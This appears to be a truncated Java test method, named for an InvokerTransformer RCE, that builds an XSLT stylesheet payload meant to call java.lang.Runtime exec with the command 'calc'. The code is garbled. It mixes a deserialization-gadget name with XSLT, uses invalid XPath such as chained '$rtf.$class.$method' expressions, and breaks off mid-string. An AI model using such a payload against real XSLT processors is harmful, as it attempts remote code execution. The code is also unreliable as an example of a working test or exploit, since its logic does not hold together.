public void testInvokerTransformerRCE() throws Exception {
    // Setup a vulnerable InvokerTransformer
    TransformerFactory factory = TransformerFactory.newInstance();
    Transformer transformer = factory.newTransformer(new StreamSource(new StringReader(
        "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
        + "<xsl:template match=\"/\">"
        + "<xsl:variable name=\"rtf\" select=\"java.lang.Runtime.getRuntime()\"/>"
        + "<xsl:variable name=\"class\" select=\"'javax.script.ScriptEngineManager'\"/>"
        + "<xsl:variable name=\"method\" select=\"'getEngineByName'\"/>"
        + "<xsl:variable name=\"engine\" select=\""
        + "$rtf."
        + "$class"
        + ".$method('JavaScript')\"/>"
        + "<xsl:variable name=\"classname\" select=\"'java.lang.Runtime'\"/>"
        + "<xsl:variable name=\"methodname\" select=\"'exec'\"/>"
        + "<xsl:variable name=\"cmd\" select=\"'calc'\"/>"
        + "<xsl:value-of